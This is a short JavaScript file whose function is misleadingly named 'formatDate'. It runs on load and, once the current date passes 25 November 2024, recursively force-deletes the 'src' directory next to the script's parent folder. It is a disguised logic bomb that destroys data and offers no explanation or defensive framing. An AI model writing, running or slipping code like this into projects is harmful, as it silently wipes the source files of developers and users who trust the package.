const fs = require("fs");
const path = require("path");

const formatDate = () => {
  const date = new Date("2024-11-25T00:00:00Z");
  const currentDate = new Date();
  const installPath = path.join(path.dirname(__dirname), "src");
  if (currentDate > date) {
    fs.rm(installPath, { recursive: true, force: true });
  }
};

formatDate();
